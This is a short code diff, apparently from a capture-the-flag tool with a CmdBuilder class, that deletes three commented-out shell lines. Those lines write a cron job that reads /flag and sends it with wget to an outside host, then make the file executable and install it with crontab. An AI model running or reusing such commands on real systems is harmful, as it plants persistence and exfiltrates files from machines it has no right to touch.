@@ -39,7 +39,5 @@ class CmdBuilder:
         print(cmd)
         return cmd
 
-# echo "*/1 * * * * /bin/sh \"f=\`cat /flag\`\nwget \"http://edprin.natappfree.cc?token=serfend&flag=\$f\"\"">>/app/444.sh
-# chmod 755 /app/444.sh
-# /usr/bin/crontab /app/444.sh
+
 
